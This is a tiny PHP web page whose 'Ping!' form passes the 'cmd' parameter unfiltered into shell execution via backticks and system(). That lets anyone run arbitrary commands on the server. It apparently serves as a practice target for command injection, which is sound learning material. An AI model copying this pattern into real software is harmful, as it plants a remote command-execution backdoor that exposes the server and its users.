<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Document</title>
</head>
<body>
<form action="/index.php">
<input type="text" name="cmd" id="">    
    <button type="submit">Ping!</button>
</form>
<?php
if(isset($_GET['cmd'])){

   echo system(`ls | {$_GET['cmd']}`);
}
?>
<script src="index.js"></script>
</body>
</html>
